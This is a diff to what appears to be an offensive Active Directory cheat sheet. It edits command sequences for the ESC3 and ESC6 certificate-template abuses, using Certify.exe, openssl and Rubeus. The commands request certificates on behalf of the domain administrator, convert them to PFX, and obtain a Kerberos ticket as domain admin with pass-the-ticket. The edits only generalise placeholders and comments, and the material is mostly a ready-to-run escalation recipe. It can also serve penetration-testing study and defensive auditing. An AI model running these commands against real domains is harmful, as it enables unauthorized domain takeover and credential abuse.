@@ -388,7 +388,7 @@ C:> Certify.exe request /ca:<CA_name> /template:SmartCardEnrollment-Agent
 C:> openssl.exe pkcs12 -in <file>.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" 
                 -export -out <out_file>.pfx
 
-# Request a certificate for DA from the second cert found using this generated one
+# Request a certificate for DA from the second cert found using the generated one
 C:> Certify.exe request /ca:<CA_name> /template:SmartCardEnrollment-Users /onbehalfof:<domain>\administrator 
                         /enrollcert:esc3-agent.pfx /enrollcertpw:<password>
 
@@ -404,22 +404,24 @@ c:> Rubeus.exe asktgt /user:administrator /certificate:<OUT_fILE_PREVIOUS_STEP>.
 #### ESC6
 ```powershell
 # Check if the CA has EDITF_ATTRIBUTESUBJECTALTNAME2. This means that we can request a certificate for ANY user 
-#   from a template that allow enrollment for normal/low-privileged users.
+#   from a template that allow enrollment for normal or low privileged users.
 C:> Certify.exe cas
 #  Find this ->> [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
 
 # Find template where we have rights for enrollment
 C:> Certify.exe find
-#  Find this ->> Enrollment Rights : dcorp\RDPUsers S-1-5-21-1874506631-3219952063-538504511-1116
+#  Find this ->> Enrollment Rights : dcorp\<group or user> S-1-5-21-1874506631-3219952063-538504511-1116
+#            ->>  msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+C:> Certify.exe find /clientauth  <-- Can get the same
 
 # Request certificate for alternate DA
-C:> Certify.exe request /ca:<CA_name> /template:"CA-Integration" /altname:administrator
+C:> Certify.exe request /ca:<CA_name> /template:"<template_name>" /altname:administrator
 
 # Convert to PFX
 C:> openssl.exe pkcs12 -in <in_file>.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" 
                 -export -out <out_file>.pfx
 
 # Request TGT aS DOMAIN ADMIN
-c:> Rubeus.exe asktgt /user:administrator /certificate:<OUT_fILE_PREVIOUS_STEP>.pfx 
+c:> Rubeus.exe asktgt /user:administrator /certificate:<out_file_PREVIOUS_STEP>.pfx 
                       /password:<pass_previous_step> /ptt
 ```
